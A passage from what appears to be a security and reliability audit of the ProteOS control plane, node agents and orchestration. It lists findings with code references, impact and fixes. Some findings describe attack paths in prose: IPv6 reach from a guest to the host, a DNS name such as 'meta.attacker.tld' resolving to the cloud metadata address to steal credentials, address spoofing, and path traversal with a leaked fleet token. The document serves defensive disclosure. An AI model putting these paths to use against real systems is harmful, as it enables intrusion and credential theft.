    `GET /api/logs/export` and `POST /api/logs/ui` in `requireAuth` only.
    `logs.go:32-41` returns the shared ring unfiltered.
  - **What the ring contains.** It holds every `slog` record
    (`cmd/controlplane/main.go:52-54`). That includes request paths carrying
    other users' machine and task ids and private repo names
    (`middleware.go:252-257`), plus GitHub logins and OIDC subjects.
  - **Forgeable.** A client-supplied `"user"` field overwrites the server's
    (`logs.go:140-151`).
  - **Evictable.** UI and server entries share one 2000-entry ring
    (`main.go:74`), so any user can push real lines out.
- **Fix:**
  - Put the reads behind `requireAdmin`, or filter them by user.
  - Set `user` last on the server side.
  - Give UI reports their own bounded buffer and a rate limit.

#### AUTH-3 — There is no way to cut a user off
`High` · security/design · Confirmed

- **Evidence:**
  - **Sessions slide forever.** Sessions slide with no absolute cap
    (`session/session.go:93-99`; the TTL is hard-coded to 30 days,
    `config.go:268`). The cookie's `Expires` is set only at login.
  - **PATs never expire by default.** `httpapi/tokens.go:56-63` treats 0 as
    "never". That is the console UI default (`TokensSection.tsx:36`), and the
    desktop `TokensPanel` cannot set an expiry at all.
  - **`users.status` is ignored.** The column exists (`000001_init.up.sql:11`)
    but is never read; neither `GetSessionByTokenHash` nor `GetPATByTokenHash`
    filters on it.
  - **No revocation tools.** There is no list, revoke-all or admin-revoke
    endpoint.
  - **No safe user deletion.** There is no delete-user path, and
    `machines.user_id … ON DELETE CASCADE` (`000002_machines.up.sql:17`) means
    a manual SQL delete drops machine rows without tearing down VMs, LUKS
    volumes or OpenBao keys.
- **Impact:** Removing someone in Zitadel doesn't touch their ProteOS sessions
  or PATs. `docs/admin-console.md:67-69` tells operators to "revoke their
  ProteOS sessions", but the only way is SQL.
- **Fix:**
  - Add an absolute session lifetime, and re-issue the cookie when the session
    slides.
  - Enforce `users.status` in both lookups.
  - Add sign-out-everywhere, plus per-user session/PAT listing and admin
    revocation.
  - Cap PAT lifetime.
  - Add an admin "suspend" (which stops the user's machines) and a "delete"
    (which runs `DestroyAll` and secret cleanup).
  - Use `ON DELETE RESTRICT` on `machines.user_id`.

#### AUTH-4 — Revocation doesn't reach long-lived connections
`Medium` · security · Confirmed

- **Evidence:**
  - **Bearer connections can't be revoked.** Bearer requests never get a
    session id (`middleware.go:84-92`), and `Registry.Register("")` is a no-op
    (`gateway/registry.go:30-33`). So `/gw/terminal`, `/gw/agent` and `/gw/ssh`
    survive a PAT revoke. `/gw/ssh` is the CLI's ProxyCommand path.
  - **SSE streams survive logout.** The SSE handlers (`sse.go:72-150`,
    `taskstream.go:26-120`) are in no registry and heartbeat indefinitely.
  - **SSH switches affect only new connections.** Turning `ssh_enabled` off or
    revoking a key only affects new connections (`gateway_ssh.go:33-39`).
  - **Expiry isn't enforced on open sockets.** Cookie terminals outlive
    session expiry, because only an explicit revoke notifies
    (`session.go:125-139`).
  - **No idle timeout** on any of these connections.
- **Impact:** A leaked PAT can be revoked, SSH disabled and the key removed,
  and the open shell still survives until the machine stops. `README.md:197`
  and `docs/plans/ssh-access.md:395-401,476-484` say otherwise.
- **Fix:**
  - Register connections under `pat:<id>` and `user:<id>`, and close them on
    PAT revoke, SSH disable and key revoke.
  - Periodically re-check liveness on long-lived streams. This also covers the
    multi-instance case (X-2).
  - Add idle timeouts.

#### AUTH-5 — Any bearer can mint permanent PATs
`Medium` · security · Confirmed

- **Evidence:**
  - `POST /api/tokens` sits behind `csrfHeader`, which skips bearers
    (`middleware.go:169-171`); `tokens_test.go:130-141` asserts this on
    purpose.
  - There is no name validation and no per-user token limit (`tokens.go:51-65`).
  - `time.Duration(req.ExpiresInDays) * 24 * time.Hour` (`:62`) overflows above
    about 106,751 days.
- **Impact:** A short-lived IdP token, including one from AUTH-1, becomes a
  permanent ProteOS credential. Revoking the parent token doesn't revoke the
  ones it minted.
- **Fix:**
  - Require a cookie session (ideally a recent sign-in) to mint tokens.
  - Cap `expires_in_days` and the number of tokens per user.
  - Add scopes, and audit the parent credential.

#### AUTH-6 — Rate limits collapse into one bucket behind the documented proxy
`High` · availability · Confirmed

- **Evidence:**
  - `httpapi/ratelimit.go:72-88` prefers `X-Real-IP`, then the leftmost
    `X-Forwarded-For`.
  - `nginx.conf:64,87,127` sets `X-Real-IP $remote_addr` with no
    `set_real_ip_from`. That address is the NPMplus or LoadBalancer hop.
  - The auth limit is 10 burst, 10/min across login and callback combined
    (`server.go:146,167-168`).
  - The PAT/IdP limit is 30 burst, 1/s, charged on every bearer request
    (`middleware.go:80`).
  - Buckets are never evicted (`ratelimit.go:62-68`).
  - Wherever nginx is bypassed, the header is client-controlled.
- **Impact:** One anonymous client looping on `/api/auth/login` locks
  everyone out of sign-in. All CLI and harness traffic shares about 1 req/s.
  Audit records show the proxy's IP.
- **Fix:**
  - Enable nginx `real_ip` with `set_real_ip_from <proxy CIDR>` and
    `real_ip_header X-Forwarded-For`, and give the control plane a list of
    trusted proxies.
  - Charge only failed bearer attempts per IP, and add a per-user bucket.
  - Evict idle buckets.

#### AUTH-7 — No request body limits or server read/idle timeouts
`Medium` · availability · Confirmed

- **Evidence:**
  - `cmd/controlplane/main.go:493-498` sets only `ReadHeaderTimeout` and
    `MaxHeaderBytes`.
  - Request bodies are decoded with no size limit at `tasks.go:75,311`,
    `machine.go:268,528`, `tokens.go:52`, `network_policy.go:70`,
    `providers.go:103`, `profile.go` and `desktop.go:60`.
  - Only `logs.go:126` and `websession.go:90` limit the body.
- **Impact:** One user can exhaust the single control plane's memory with a
  multi-GB prompt, or hold goroutines open with slow bodies. Prompts are also
  stored unbounded in `agent_tasks`.
- **Fix:**
  - Add a global `http.MaxBytesReader` (1 MiB; 64–256 KiB for prompts) and
    per-field caps.
  - Set `ReadTimeout` and `IdleTimeout`, and per-route write timeouts that
    exempt SSE and WebSocket routes.

#### AUTH-8 — The audit trail has gaps
`Medium` · security/ops · Confirmed

- **Evidence:**
  - **Missing fields.** `audit.Entry` (`audit/audit.go:101-107`) records no auth
    method, credential id, client IP or user agent.
  - **Unaudited actions:**
    - terminal open (`gateway.go`);
    - SSH connect (`gateway_ssh.go`);
    - editor/preview session mint (`websession.go`);
    - project zip download (`download.go`, the main exfiltration path);
    - admin fleet reads;
    - rename;
    - git identity;
    - most preferences.
  - **Unaudited auth events:** login failures, bearer auto-provisioning, email
    linking, and `is_admin` changes.
  - **Spurious entries.** `handlers.go:37-56` writes `session.revoke` even when
    nothing was revoked.
  - **No read API** for the audit log.
- **Fix:**
  - Add the missing fields.
  - Audit the routes above, and record linking and role changes as their own
    actions.
  - Expose per-user and admin views of the audit log.

#### AUTH-9 — A sibling app's bearer token demotes an admin
`Low` · correctness · Likely

- **Evidence:**
  - `bearer.go:86` leads to `auth.go:249,257-264`, which runs
    `UpdateOIDCUserProfile` with `IsAdmin` taken from userinfo.
  - Harness tokens carry no roles (`oidc/client.go:140-144`).
  - As a result, every bearer resolution from the harness clears `is_admin`.
- **Impact:** The admin's browser session gets 403 on the admin console until
  they sign in again. This contradicts `docs/admin-console.md:60-69`.
- **Fix:** Refresh `is_admin` only on the browser callback, or only when the
  roles claim is present.

#### AUTH-10 — Small validation issues
`Low` · correctness/security · Confirmed

- **Error leakage.** Raw internal error text is returned to clients
  (`httpapi/machine.go:309,373-374,433-434`), including host names and dial
  addresses.
- **Signing key.** `PROTEOS_STATE_KEY` has no minimum length and is reused for
  three purposes (`config.go:335-337`).
- **Allowlist case.** The GitHub allowlist comparison is case-sensitive
  (`auth.go:386`), but GitHub logins are not.
- **Name limits.** Machine and PAT names have no length or charset limits.
- **Silent default on bad input.** `decodeCreateOptions`
  (`machine.go:517-538`) ignores a malformed body and creates a default machine
  instead of returning 400.

### 4.4 Node-agent and host isolation (NODE)

#### NODE-1 — Firecracker isolation is IPv4-only, so a guest can reach the host over IPv6 on its tap
`High` · security · Confirmed (no IPv6 filtering); Likely (impact depends on host sysctls)

- **Evidence:**
  - **IPv4-only rules.** `nodeagent/internal/driver/firecracker/network.go:87`
    creates `nft add table ip proteos`, and every rule is in the `ip` family.
  - **IPv6 left on.** Nothing in the code, Ansible or image sets
    `disable_ipv6` or `accept_ra`, or creates an `inet`/`ip6` table. Once a
    tap is up it gets an `fe80::` address.
  - **Dual-stack listener.** The agent defaults to `:9090`, which Go binds
    dual-stack.
  - **The optional Ansible firewall doesn't fully cover it.**
    `proteos-agent-fw.nft.j2` is `inet`, but it is off by default
    (`proteos_restrict_agent_port: false`). When on, it accepts port 22 on any
    interface.
- **Impact:** A guest can discover the host on `ff02::1%eth0` and connect to
  `[fe80::…]` on port 9090 (the unauthenticated `/metrics` and `/healthz`, and
  the TLS stack ahead of auth), on 22, or on any other `[::]` listener. It can
  also send Router Advertisements, which the host accepts by default when
  IPv6 forwarding is off. This breaks the SECURITY.md premise that the guest
  has no network surface on the host.
- **Fix:**
  - Before the tap goes up, set `net.ipv6.conf.<tap>.disable_ipv6=1` (at
    minimum `accept_ra=0`).
  - Move the rules to an `inet` table that drops IPv6 from taps on both input
    and forward.
  - Bind the API to the management address only.

#### NODE-2 — The Cilium FQDN policy bypasses the private-range and metadata egress deny
`High` · security · Confirmed (policy generation); Likely (exploit on a live Cilium cluster)

- **Evidence:**
  - `nodeagent/internal/driver/kubernetes/fqdn.go:172-187` emits only a DNS
    `toEndpoints` rule and `toFQDNs`. There is no `egressDeny` and no CIDR
    exclusion.
  - The IP-snapshot path does filter, via `routable()`
    (`kubernetes/network.go:341`).
  - The user controls `allow_domains`.
- **Impact:** Cilium takes the union of all allow rules. A user can list
  `meta.attacker.tld`, have it resolve to `169.254.169.254` or to any
  off-cluster RFC1918 address, and the DNS proxy then admits that address. The
  result is cloud-metadata credentials or LAN reach. SECURITY.md:110-113,119-121
  says the opposite.
- **Fix:**
  - Add an `egressDeny` with `toCIDRSet` covering the private CIDRs and
    `ClusterCIDRs` to every CNP. Deny takes precedence over allow.
  - Add a unit test that asserts the deny block is present.

#### NODE-3 — One static bearer token serves the whole fleet, with no mTLS and no per-host scope
`High` · security/design · Confirmed

- **Evidence:**
  - `controlplane/internal/config/config.go:137-140` describes the "shared
    bearer token presented to every node-agent".
  - `nodeagent/internal/httpapi/httpapi.go:66-81` checks one static token,
    compared in constant time.
  - The agent serves TLS without client-certificate verification.
  - The cluster-agent uses the same value.
  - `deploy/node-agent/setup-service.sh:7` copies the env file without
    `chmod 600`.
  - `/metrics` is unauthenticated (`httpapi.go:55`).
- **Impact:** Root on any one KVM host, or read access to the Kubernetes
  Secret, yields the credential for every host. With it an attacker can open
  guest tunnels to any tenant's terminal fleet-wide and destroy every machine.
  Rotating the token requires restarting every component in lock-step.
- **Fix:**
  - Issue per-host credentials: per-host tokens stored in `hosts`, or better,
    mTLS with per-host certificates pinned in both directions.
  - Accept two tokens during rotation.
  - Authenticate `/metrics` or move it to its own listener.
  - Ship the env file as `0600`.

#### NODE-4 — Ensure, Stop and Destroy aren't serialised per machine, which can corrupt rootfs and snapshots
`High` · correctness/data integrity · Confirmed (agent side); Likely (control-plane trigger)

- **Evidence:**
  - **Only Ensure checks the booting map.** The `booting` map
    (`firecracker/firecracker.go:176-187`) guards only `EnsureRunning`.
  - **Ensure can reboot a live VMM.** A record in `stopping`/`hibernating`
    with a live VMM takes the reboot path (`:219-245`). `coldBoot` then wipes
    the jail, overwrites `/state/rootfs.ext4` while the paused VMM is still
    snapshotting (`:344`), and deletes `snap/` (`:347`).
  - **Stop doesn't coordinate.** `Stop` (`:542-563`) doesn't check for
    in-flight operations. `finishStop` ends by unconditionally writing
    `Stopped/Pid=0/Snapshot=snap` (`:638-642`).
  - **Destroy doesn't coordinate either** (`:659-685`). A boot goroutine keeps
    running after it, because `store.Update` returns `ok=false, err=nil` for a
    deleted record and the caller only checks `err` (`:370`).
  - **The control plane triggers it.** It moves a hibernating machine to
    `error` on a single failed poll (ORCH-2), then allows Start from `error`.
- **Impact:** The next resume restores RAM that doesn't match the disk. VMMs
  are orphaned, and the reaper later kills the new one. User state is lost.
- **Fix:**
  - Hold a per-machine operation lock across the whole async operation.
  - Make Ensure wait, or return 409, while the machine is stopping.
  - Make Destroy cancel and await in-flight work.
  - Treat `ok=false` as an abort.

#### NODE-5 — Machine ids and image refs aren't validated, and device names are truncated to 8 hex characters
`Medium` · security (defence in depth) · Confirmed

- **Evidence:**
  - **Unvalidated ids reach file paths.** `httpapi.go:88` passes
    `r.PathValue("id")` straight to the driver; `PathValue` decodes `%2F`.
    The id is used in `state.go:110` (`filepath.Join(s.dir, id+".json")`),
    `volume.go:48` (`<VolumesDir>/<id>.luks`), and the jail `os.RemoveAll`
    (`jail.go:56-121`), which runs before the jailer's own id check.
  - **Unvalidated image refs.** `KernelRef`/`RootfsRef` are joined unvalidated
    (`firecracker.go:318-319`).
  - **Truncated device names.** Tap and mapper names use `ID8`, the first 8 hex
    characters (`state.go:319-326`, `volume.go:53`).
  - **Mapper reuse.** `volume.go:106-120` reuses any active mapper with that
    name without checking its backing file.
- **Impact:** Machine ids come from the control plane, so path traversal needs
  the agent token (see NODE-3). With it, though, the agent will `RemoveAll`
  arbitrary host paths as root. An 8-hex collision is very unlikely (about
  1 in a million with 100 machines on a host). If it happens, one machine
  mounts another tenant's decrypted volume.
- **Fix:**
  - Validate ids as canonical UUIDs and refs as base names.
  - Use the full 32-hex id for device-mapper names (the limit is 127
    characters).
  - Derive tap names from a persisted per-host index.
  - Verify the mapper's backing device with `cryptsetup status`.
  - Add `MaxBytesReader`.

#### NODE-6 — VMM liveness is a bare pid probe that is never re-checked
`Medium` · correctness/security · Confirmed

- **Evidence:**
  - **Weak probe.** `exec.go:50-56` sends signal 0 and counts EPERM as alive.
  - **Unchecked kills.** Stop and Destroy SIGKILL `rec.Pid` without checking
    what process it is (`firecracker.go:620-626,670-672`).
  - **Status never re-checked.** `Status` and `List` only read the record.
  - **Fragile pid discovery.** The pid comes from the first line of
    `pgrep -u uid -f firecracker` (`jail.go:107-112`).
  - **Unused state query.** `fcAPI.instanceState` exists but is never called.
- **Impact:**
  - With `reboot=k panic=1`, a guest reboot or panic exits Firecracker, yet the
    machine reports `running` forever.
  - After a host reboot or pid wrap, the agent can adopt an unrelated pid and
    later SIGKILL it as root.
- **Fix:**
  - Verify the process identity: `/proc/<pid>/comm`, the uid, and membership
    of the per-VM jailer cgroup.
  - Read the pid from that cgroup instead of `pgrep`.
  - Add a supervision loop that moves dead VMMs to `stopped`/`error`.

#### NODE-7 — Gaps in crash recovery
`Medium` · correctness · Confirmed

- **Evidence:**
  - **Stranded mid-boot.** After a restart mid-boot, Reattach does nothing for
    a `creating` record with a live pid (`firecracker.go:744-756`). Ensure
    returns early for that state (`:219-221`). Only Destroy gets the machine
    out.
  - **Stale snapshot reuse.** `resume()` deletes the snapshot and clears
    `Snapshot.Present` only after the 30s guest-resume call (`:504-523`). If
    the agent crashes in that window, the next Ensure resumes stale RAM over a
    disk that has moved on.
  - **One bad record breaks the store.** `state.listLocked` fails entirely on
    one undecodable `*.json` (`state.go:264-266`). That breaks IP allocation,
    List, Reattach and the reaper.
  - **No directory fsync** after the rename.
- **Fix:**
  - Persist the boot step, and on reattach re-boot any VMM that isn't
    `Running`.
  - Clear the snapshot immediately after `LoadSnapshot` succeeds.
  - Quarantine corrupt records instead of failing the whole listing.
  - fsync the directory.

#### NODE-8 — Guests can spoof source addresses
`Medium` · security · Confirmed (rules); Likely (depends on rp_filter)

- **Evidence:**
  - The forward rules match only `iifname <tap>` (`network.go:287-316`). The
    catch-all `tap → egress accept` has no `ip saddr` check.
  - Masquerade applies only to `saddr <guest>/32`.
  - Only `ip_forward` is set; `rp_filter` is never touched.
- **Impact:** A guest can send un-NATed packets with arbitrary public source
  addresses from the host's uplink. That enables reflection and amplification
  attacks attributed to the operator, the abuse the production plan calls
  out. A guest can also spoof a neighbour guest's address.
- **Fix:**
  - Make the first per-tap rule `iifname <tap> ip saddr != <guestIP> drop`.
  - Set `rp_filter=1` on taps.

#### NODE-9 — `allow_domains` (and DNS under `deny_all`) is effectively broken on Firecracker
`Medium` · correctness · Confirmed (AAAA in `ip` rules); Likely (nft rejection)

- **Evidence:**
  - **Boot aborts on dual-stack names.** `network.go:341` uses
    `net.LookupHost`, which returns AAAA records too. `:304` puts those into
    `ip daddr` rules, and `:219-222` aborts tap setup on the first nft error.
    So any dual-stack name fails the boot.
  - **DNS is blocked.** The guest resolvers are 1.1.1.1 and 8.8.8.8
    (`image/build-rootfs.sh:1185-1186`). Under `allow_domains` they aren't in
    the allowed set, and `deny_all` drops DNS entirely.
  - **The Kubernetes driver behaves differently.** It always allows DNS
    (`kubernetes/network.go:240`).
- **Fix:**
  - Filter to IPv4, or add `ip6` rules in an `inet` table.
  - Always allow port 53 to the configured resolvers.
  - Use nft sets.
  - Add tests with AAAA records and DNS.

#### NODE-10 — No virtio rate limiters and only a CPU cgroup on the VMM
`Medium` · availability (noisy neighbour) · Confirmed

- **Evidence:**
  - The `drive` and `networkInterface` configs have no `rate_limiter`
    (`fcapi.go:106-117`).
  - The jailer gets only `--cgroup cpu.weight=512` (`jail.go:93-94`): no
    `memory.max`, `io.max` or `pids.max`, and no `--netns`.
  - The plan marks "cgroup enforcing CPU/memory/io" as done
    (`plans/proteos-poc-to-prod.md:84-85,358`).
- **Impact:** One guest running `fio` can saturate the host's disk (amplified
  by dm-crypt CPU cost) and its uplink. Other tenants then stall, and their
  hibernate snapshots time out and fall back to a cold poweroff.
- **Fix:**
  - Set per-drive and per-NIC token-bucket rate limiters from the template.
  - Add `io.max`, `memory.max` (guest memory plus overhead) and `pids.max`.
  - Consider a per-VM network namespace.

#### NODE-11 — Disk is overcommitted, unaccounted, and never checked for free space
`Medium` · ops/correctness · Confirmed

- **Evidence:**
  - **Sparse, but counted as disk only.** Containers are sized
    rootfs + mem + disk + 512 MiB and created sparse (`volume.go:71-73,223-233`).
    Capacity counts only `DiskMiB` (`firecracker.go:722`).
  - **Full rootfs copy each boot.** Every cold boot writes a full, non-sparse
    rootfs copy (`jail.go:126-141`).
  - **No resize on growth.** A memory increase never resizes the container, so
    later hibernates hit ENOSPC and silently fall back to a poweroff
    (`:586-598`).
  - **No free-space checks** anywhere.
- **Impact:** Once the volumes directory fills, every machine on the host gets
  EIO from its filesystem, across tenants.
- **Fix:**
  - Account for the full container size in capacity.
  - Check free space before format, boot and hibernate.
  - Resize, or refuse, on growth.
  - Keep sparseness when copying the rootfs.

#### NODE-12 — Kubernetes machine pods have unbounded ephemeral storage
`Medium` · availability · Confirmed (no limits); Likely (impact)

- **Evidence:**
  - `kubernetes/pod.go:257` sets `ReadOnlyRootFilesystem: false`.
  - The pod resources (`:404-425`) set only CPU and memory.
  - The quota example has no `ephemeral-storage`.
- **Impact:** One machine can fill the node's disk, which triggers
  DiskPressure evictions of other tenants' machines.
- **Fix:** Set `ephemeral-storage` requests and limits on both containers, and
  add them to the LimitRange and quota.

#### NODE-13 — The Kubernetes agent-to-pod tunnel is plaintext and carries secrets
`Medium` · security · Confirmed

- **Evidence:** `kubernetes/guest.go:65-86` dials the pod IP over raw TCP and
  writes the token preamble in cleartext. The same channel later carries
  terminal traffic and `/secrets` injection.
- **Impact:** When the cluster-agent and the pod are on different nodes,
  provider keys and the per-boot token cross the pod network in plaintext.
- **Fix:** Use TLS on the guest listeners with a per-boot certificate (or PSK)
  delivered in the same Secret and pinned by the agent. Alternatively, require
  CNI encryption and document that requirement.

#### NODE-14 — The production Firecracker driver never runs the conformance suite
`Medium` · testing · Confirmed

- **Evidence:**
  - `conformance.Run` is called only from `dev/conformance_test.go:20` and
    `kubernetes/kubernetes_test.go:72`.
  - The Firecracker driver's unit-test seams (`statemachine_unit_test.go`)
    could host it, yet `docs/architecture.md:62-67` says all three drivers are
    held to the suite.
  - With `SupportsHibernateSnapshot=true`, the suite asserts nothing about
    snapshots.
- **Fix:** Run the suite against the Firecracker driver with fakes in CI. Add
  cases for:
  - concurrent Ensure/Stop/Destroy, and Ensure while stopping;
  - reattach after a VMM death or a crash mid-boot;
  - a hibernate → resume round trip;
  - a traversal-style id;
  - capacity accounting;
  - Status after a guest-initiated exit.

  NODE-4 to NODE-7 would have been caught.

#### NODE-15 — LUKS runs the default argon2id KDF on every open
`Medium` · performance · Likely

- **Evidence:** `volume.go:196-202` calls `luksFormat`/`open` without
  `--pbkdf`. The key is 32 random bytes.
- **Impact:** Each open costs about 2 s and up to about 1 GiB of RAM. Mass
  restarts after a host reboot then put memory pressure on running VMMs. A KDF
  adds nothing for a random 256-bit key.
- **Fix:**
  - Use `--pbkdf pbkdf2 --pbkdf-force-iterations 1000`, or a small
    `--pbkdf-memory`.
  - Zero the key slice after use.

#### NODE-16 — Lower-severity node-agent issues
`Low` · various · Confirmed

- **Network probe tests only ingress.** The NetworkPolicy probe
  (`kubernetes/probe.go:98-155`) never tests egress denial, although the
  RFC1918 and metadata deny depends on it. It also counts any dial error,
  including a crashed canary, as "enforced".
- **Reaper kills too eagerly.** The orphan reaper (`reaper.go:43-67`) SIGKILLs
  any `firecracker` process not in its record list. That includes a VMM in the
  window between launch and `store.Update(Pid)`, and non-ProteOS Firecracker
  processes.
- **Jail uid collisions.** The jail uid is derived from the IP's last octet,
  and `/24` is hard-coded (`firecracker.go:782-808`), while the config accepts
  any prefix. Two VMs can therefore share a uid, and `pgrep` may record the
  wrong VM's pid.
- **Host-wide firewall side effects.** The agent lazily installs `policy drop`
  input and forward chains for all host IPv4 traffic and enables `ip_forward`
  globally (`network.go:91-103,203`). It also re-adds global accepts one exec
  at a time, non-atomically, on every boot (`:116-121`).
- **Symlinks followed as root.** Root operations on the VMM-writable `/state`
  tree follow symlinks (`jail.go:132,143-150`, `snapshot.go:37-42`).
- **Unbounded metric label.** A VMM-controlled `level` field becomes a
  Prometheus label (`fclog.go:88`).

### 4.6 Machine orchestration, tasks and persistence (ORCH)

#### ORCH-1 — One unreachable host flips every running machine in the fleet to `error`
`High` · availability · Confirmed

- **Evidence:**
  - `controlplane/internal/nodeclient/registry.go:154-171`: `Registry.List`
    "fails fast on the first unreachable host".
  - `machine/poller.go:161-174` reacts to any `List` error by incrementing the
    blip counter for **every** running machine, and moves each to `error` after
    3 sweeps (about 90 s).
  - Hosts are only ever upserted (`cmd/controlplane/main.go:247-262`). Nothing
    deactivates a host that has been removed from `PROTEOS_HOSTS`.
- **Impact:** One dead or decommissioned host takes every healthy host's
  machines to `error` within about 90 s. Their control channels are torn down
  too. This contradicts `scheduler.go:27-29` ("one being down doesn't stop new
  machines").
- **Fix:**
  - Return per-host results from `List`, and apply the blip logic only to
    machines on the failed host.
  - Deactivate hosts that are absent from config, or add explicit statuses
    (see ORCH-10).

#### ORCH-2 — `error` is a dead end: brief agent faults become lasting errors
`High` · correctness/design · Confirmed

- **Evidence:**
  - The only exit from `error` is a user-initiated Start (`machine/state.go:53`).
  - The poller lists only transitional and running machines
    (`poller.go:128,153`), so nothing re-checks an `error` machine.
  - A stopping or hibernating machine goes to `error` on its **first** failed
    Status call (`poller.go:228`), right when a multi-GB snapshot makes the
    agent slow.
  - A failed Stop call (`service.go:469-471`) or initial Ensure
    (`:716-719`) also fails the machine immediately. The client-side 10 s
    timeout doesn't mean the agent didn't act.
  - The resulting `error` tears down the guest control channel
    (`guestctl/manager.go:131`), and git and task routes then return
    `machine_not_running`.
- **Impact:** A network hiccup, an agent restart or one slow Stop leaves
  healthy VMs marked `error` until someone clicks Start. Start-from-`error`
  then feeds NODE-4. The backlog item "idle machines report as error" is
  marked done but is only mitigated (a 90 s fuse).
- **Fix:**
  - Track agent reachability separately from lifecycle state, e.g. with
    `last_seen_at` or an `unknown` substate.
  - Add a reconcile pass over `error` and `stopped` machines that converges to
    what the agent reports.
  - Apply the retry budget to stop-path polls and to the first Ensure/Stop call
    as well.

#### ORCH-3 — The poller can race the initial Ensure
`High` · correctness · Confirmed (path); frequency depends on latency

- **Evidence:**
  - Create and Start commit `provisioning`/`starting` **before** calling the
    agent (`service.go:362-368,433-437`).
  - In between, `buildEnsureRequest` makes an OpenBao read and three DB queries
    (`:686-702`).
  - Meanwhile the 2 s poller treats `ErrUnknownMachine` on a provisioning
    machine as an error (`poller.go:211-218`), and treats `stopped` on a
    starting machine the same way (`:244-245`).
  - Tests drive the poller manually, so this interleaving is never exercised.
- **Impact:** A machine shows `error` while its VM boots and runs normally, and
  ORCH-2 means nothing fixes it. A control-plane crash between the transition
  and the Ensure has the same result.
- **Fix:** Record an "ensure dispatched" marker once the agent acknowledges.
  Until it is set, or within a grace period, the poller treats unknown and
  stopped as pending.

#### ORCH-4 — Agent tasks can stay `running` forever
`High` · correctness · Confirmed

- **Evidence:**
  - **Completion is fire-and-forget.** If no channel is up, the guest logs and
    drops `agent.done` (`guestagent/internal/ctlchan/agentrun.go:564-569`;
    `guestctl/manager.go:498`: "the guest does not retry").
  - **Channels drop often.** They drop on control-plane restarts, on
    hibernate/poweroff, and on the false `error` flips above.
  - **Poweroff sends no completion at all.**
  - **Cancel stops working.** Cancel needs a live channel
    (`httpapi/tasks.go:273-276`). After a reboot, the guest silently ignores a
    cancel for an unknown task id, and the control plane returns 202.
  - **Follow-ups are refused** while the status is `running`
    (`tasks.go:333-336`).
  - **No reconciliation.** No query or job ever moves a stale `running` row to
    a terminal state.
- **Impact:** Any task in flight during a deploy or a machine stop shows as
  running forever. It can't be resumed or cancelled, and SSE subscribers wait
  indefinitely.
- **Fix:**
  - **Guest:** persist pending `agent.done` payloads and replay them on
    reconnect; the control plane de-duplicates by task id.
  - **Control plane:** when a machine leaves `running` (and at startup), mark
    its running tasks `failed`/`interrupted`.
  - Add a deadline sweep (the guest timeout is 30 min).
  - Let cancel on a non-running machine finalise the row directly.

#### ORCH-5 — No capacity admission control, and per-user caps are racy and don't bound resources
`High` · availability/design · Confirmed

- **Evidence:**
  - **Single host skips capacity.** `machine/scheduler.go:53-55`:
    `if len(hosts) == 1 { return hosts[0], nil }`. That is the default
    deployment, and capacity is never consulted.
  - **Multi-host has no reservation.** Capacity comes from the agent's view
    with no reservation, so concurrent creates see the same free memory.
    `UsedDiskMiB` is ignored, and stopped machines count as free although
    they can resume at any time.
  - **Start and Ensure don't check.** Start (`service.go:424-438`) doesn't
    check capacity, and the agent never rejects an Ensure for capacity.
  - **The per-user cap races.** It counts, then inserts in a separate
    statement (`service.go:288-294,321`), and the per-user rate limiter allows
    a burst of 5. `CreateUpToLimit` repeats the pattern (`:616-633`).
  - **The cap is per machine, not per resource.** It allows 5 × 16 GiB × 8
    vCPU, while the agent's default capacity is 8 GiB.
- **Impact:** One user can put 80 GiB of guests on an 8 GiB host. Firecracker
  memory is lazily backed, so the failure shows up later, as host OOM kills of
  random users' VMMs.
- **Fix:**
  - Do admission in the control plane inside a transaction: sum the
    `resource_spec` of non-deleted machines per host against its configured
    capacity, under `SELECT … FOR UPDATE` on `hosts`.
  - Re-check on Start.
  - Have the agent reject over-capacity Ensures as defence in depth.
  - Enforce the per-user count under a per-user lock, and add aggregate
    vCPU/memory/disk quotas.

#### ORCH-6 — Follow-up turns can double-dispatch, and a fast failure gets reset to `running`
`Medium` · correctness · Confirmed

- **Evidence:**
  - `httpapi/tasks.go:333` checks the status, `:372` dispatches, and only
    `:387` calls `RestartAgentTask`.
  - That query has no status guard (`queries.sql:467-476`: `WHERE id = $1`).
- **Impact:** Two tabs, or the CLI plus a tab, can start two concurrent runs on
  the same worktree. A run that fails within milliseconds is overwritten back
  to `running` with `ended_at = NULL`, permanently (ORCH-4).
- **Fix:** Claim the task with a compare-and-swap before dispatch:
  `UPDATE … SET status='running' WHERE id=$1 AND status IN ('done','failed','canceled') RETURNING`.
  Roll it back if dispatch fails.

#### ORCH-7 — Stop can leave a machine stuck in `stopping`/`hibernating`
`Medium` · correctness · Confirmed

- **Evidence:**
  - The transition commits, then the agent Stop runs on the **request**
    context (`service.go:463-471`, `httpapi/machine.go:468`).
  - If the client disconnects (Ctrl-C, a closed tab) or the control plane
    crashes, Stop never reaches the agent, and `fail()` reuses the cancelled
    context.
  - The poller waits forever while the agent reports `running` (`poller.go:253`).
  - From those states the user can neither Start nor Stop; only Destroy works.
- **Fix:**
  - Run side effects after the transition on `context.WithoutCancel` with its
    own timeout.
  - Have the poller re-issue Stop, and give the operation a deadline based on
    `updated_at`.

#### ORCH-8 — Create isn't atomic, which strands `requested` rows and leaks volume keys
`Medium` · correctness · Confirmed

- **Evidence:**
  - `service.go:321-362` runs five separate autocommits: create machine, create
    disk, link disk, mint key, transition.
  - The compensating delete uses the request context, never runs after a
    crash, and doesn't delete the minted key.
  - `requested` is never polled.
- **Impact:** Phantom machines count against the user's cap, and keys leak in
  OpenBao.
- **Fix:**
  - Run the DB statements in one transaction, and mint the key last (or delete
    it as compensation) using a detached context.
  - Garbage-collect `requested` rows older than N minutes.

#### ORCH-9 — The control plane never reconciles against the agents, and any 404 means "gone"
`Medium` · ops/correctness · Confirmed

- **Evidence:**
  - SweepRunning iterates only machines the DB knows (`poller.go:180-198`).
    Machines the agent runs without a DB row are ignored, and they still
    consume capacity.
  - There is no `destroying` tombstone, so an in-flight Start can race a
    Destroy.
  - `nodeclient.go:275-277` maps **every** 404 to `ErrUnknownMachine` without
    checking the body's code. Destroy then deletes the key and row, and the
    stop path marks the machine stopped.
  - Restoring Postgres to an older backup (DR scenario 1) leaves newer machines
    running on the agent with no row.
- **Fix:**
  - Add a per-host diff between the agent's list and the DB that reports
    orphans and exposes a metric. Optionally destroy them after a grace period.
  - Match the 404 body code.
  - Add a `destroying` state.

#### ORCH-10 — No host lifecycle (cordon, drain, retire) and no procedure for losing a host
`Medium` · ops/design · Confirmed

- **Evidence:**
  - The only knob is `hosts.status`, and nothing mutates it.
  - Setting a host non-active hides it from `List` but not from the sweep,
    which then errors its machines (`poller.go:182-187`).
